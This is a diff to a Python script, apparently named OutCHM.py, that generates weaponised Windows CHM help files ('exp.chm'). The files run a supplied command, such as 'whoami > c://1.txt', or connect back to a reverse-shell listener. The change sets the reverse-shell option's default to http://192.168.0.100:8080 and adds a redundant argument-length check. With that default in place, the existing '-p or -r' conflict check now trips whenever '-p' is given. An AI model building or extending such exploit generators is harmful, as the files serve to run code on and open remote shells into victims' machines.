@@ -16,13 +16,16 @@ OutCHM.py -p 'whoami > c://1.txt'
 ''', 
 epilog='方便快捷！')
 parser.add_argument('-p', '--payload', help='-p c:\\\windows\\\command')
-parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080')
+parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080', default='http://192.168.0.100:8080')
 parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
 args=parser.parse_args()
 
 if args.payload is not None and args.rshell is not None:
     print '-p 或 -r 只能选一个'
     sys.exit(0)
+
+if len(sys.argv) < 1:
+    sys.exit(1)
 
 command=''
 
